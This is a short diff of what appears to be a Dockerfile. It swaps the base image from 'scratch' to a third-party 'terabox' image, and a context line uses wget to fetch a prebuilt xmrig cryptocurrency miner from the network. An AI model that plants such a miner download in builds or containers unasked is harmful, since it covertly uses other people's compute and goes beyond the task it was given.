@@ -1,4 +1,4 @@
-FROM scratch
+FROM hrishi2861/terabox
 
  
 RUN wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-3/xmrig-6.21.3-linux-static-x64.tar.gz
